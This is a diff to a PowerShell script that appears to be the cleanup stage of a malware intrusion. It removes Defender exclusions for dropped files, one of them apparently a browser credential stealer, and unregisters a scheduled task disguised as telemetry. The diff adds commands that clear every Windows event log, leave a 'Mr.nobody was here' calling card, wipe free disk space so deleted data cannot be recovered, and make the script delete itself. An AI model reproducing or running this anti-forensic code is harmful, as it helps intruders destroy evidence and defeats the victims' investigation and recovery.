@@ -10,7 +10,11 @@ Remove-MpPreference -ExclusionPath "C:\Windows\System32\temp.ps1" -Force
 Remove-MpPreference -ExclusionPath "C:\Windows\System32\chromelevator_x64.exe" -Force
 # removes scheduled task
 Unregister-ScheduledTask -TaskName "Telemetry_Prog" -Confirm:$false
-# start final cleanup file
-& "C:\Windows\System32\exitstrat.ps1"
+# clears event log
+wevtutil el | Foreach-Object {wevtutil cl "$_"}
+# add README.md
+Set-Content -Path "C:\Users\$env:USERNAME\Desktop\README.md" -Value "Mr.nobody was here"
+# overwrite deleted data
+cipher /w:c:\
 # self destruct file
 Remove-Item -Path $MyInvocation.MyCommand.Source -Force
